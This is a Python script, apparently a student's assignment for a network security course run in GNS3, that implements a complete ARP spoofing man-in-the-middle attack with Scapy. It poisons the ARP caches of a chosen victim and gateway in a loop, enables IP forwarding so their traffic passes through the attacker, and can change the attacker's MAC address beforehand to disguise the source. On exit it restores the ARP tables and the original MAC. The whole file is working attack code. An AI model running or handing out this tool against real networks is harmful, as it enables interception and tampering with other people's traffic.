#!/usr/bin/env python3
# =============================================================================
# Nombre:      arp.py
# Autor:        Miguel Ramirez Meli
# Matrícula:    2025-1367
# Asignatura:   Seguridad de redes
# Requisitos:   Kali Linux, Python 3, Scapy,gns3
# =============================================================================

#!/usr/bin/env python3
from scapy.all import ARP, Ether, srp, sendp, get_if_hwaddr
import time
import subprocess
import random

def get_mac(ip, iface):
    answered, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
        iface=iface,
        timeout=3,
        verbose=False,
        retry=3
    )
    if answered:
        return answered[0][1].hwsrc
    return None

def random_mac():
    mac = [0x00, 0x16, 0x3e,
           random.randint(0x00, 0x7f),
           random.randint(0x00, 0xff),
           random.randint(0x00, 0xff)]
    return ':'.join(f"{x:02x}" for x in mac)
    
def change_mac(iface, new_mac):
    subprocess.run(["ip", "link", "set", iface, "down"])
    subprocess.run(["ip", "link", "set", iface, "address", new_mac])
    subprocess.run(["ip", "link", "set", iface, "up"])
    print(f"[✓] MAC cambiada a: {new_mac}")
    print("[*] Esperando a que el puerto del switch vuelva a 'forwarding'...")
    time.sleep(20)  # <-- da tiempo a que el switch termine el proceso de STP

def restore_mac(iface, original_mac):
    subprocess.run(["ip", "link", "set", iface, "down"])
    subprocess.run(["ip", "link", "set", iface, "address", original_mac])
    subprocess.run(["ip", "link", "set", iface, "up"])
    print(f"[✓] MAC restaurada a: {original_mac}")

def spoof(target_ip, spoof_ip, iface):
    target_mac = get_mac(target_ip, iface)
    if not target_mac:
        print(f"[!] No se pudo obtener la MAC de {target_ip}")
        return
    attacker_mac = get_if_hwaddr(iface)
    packet = Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip,
        hwsrc=attacker_mac
    )
    sendp(packet, iface=iface, verbose=False)

def restore(target_ip, gateway_ip, iface):
    target_mac  = get_mac(target_ip, iface)
    gateway_mac = get_mac(gateway_ip, iface)
    if not target_mac or not gateway_mac:
        print("[!] No se pudo restaurar la ARP table")
        return
    packet = Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=gateway_ip,
        hwsrc=gateway_mac
    )
    sendp(packet, iface=iface, count=5, verbose=False)

if __name__ == "__main__":
    print("=" * 40)
    print("   ARP MitM Spoofing - Scapy")
    print("=" * 40)

    VICTIM_IP  = input("\n[?] IP de la víctima  : ")
    GATEWAY_IP = input("[?] IP del gateway    : ")
    IFACE      = input("[?] Interfaz de red   : ")

    # Cambio de MAC
    original_mac = get_if_hwaddr(IFACE)
    print(f"\n[*] Tu MAC actual: {original_mac}")
    cambiar = input("[?] ¿Deseas cambiar tu MAC antes del ataque? (s/n): ").strip().lower()

    if cambiar == "s":
        opcion = input("[?] ¿MAC aleatoria o manual? (a/m): ").strip().lower()
        if opcion == "a":
            nueva_mac = random_mac()
        else:
            nueva_mac = input("[?] Ingresa la nueva MAC (ej: 00:11:22:33:44:55): ").strip()
        change_mac(IFACE, nueva_mac)
    else:
        print("[*] Se usará la MAC original")

    # Habilitar IP forwarding
    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], stdout=subprocess.DEVNULL)
    print("[✓] IP Forwarding activado")

    # Verificar MACs
    print("[*] Obteniendo MACs...")
    victim_mac  = get_mac(VICTIM_IP, IFACE)
    gateway_mac = get_mac(GATEWAY_IP, IFACE)

    if not victim_mac:
        print(f"[✗] No se encontró la MAC de la víctima ({VICTIM_IP}).")
        exit(1)
    if not gateway_mac:
        print(f"[✗] No se encontró la MAC del gateway ({GATEWAY_IP}).")
        exit(1)

    print(f"[✓] MAC víctima  : {victim_mac}")
    print(f"[✓] MAC gateway  : {gateway_mac}")
    print(f"\n[*] Iniciando ataque... Presiona Ctrl+C para detener\n")

    try:
        count = 0
        while True:
            spoof(VICTIM_IP, GATEWAY_IP, IFACE)
            spoof(GATEWAY_IP, VICTIM_IP, IFACE)
            count += 2
            print(f"\r[*] Paquetes enviados: {count}", end="", flush=True)
            time.sleep(1.5)
    except KeyboardInterrupt:
        print("\n\n[!] Deteniendo ataque, restaurando ARP...")
        restore(VICTIM_IP, GATEWAY_IP, IFACE)
        restore(GATEWAY_IP, VICTIM_IP, IFACE)

        # Restaurar MAC original si fue cambiada
        if cambiar == "s":
            print("[*] Restaurando MAC original...")
            restore_mac(IFACE, original_mac)

        print("[✓] Todo restaurado correctamente.")
              
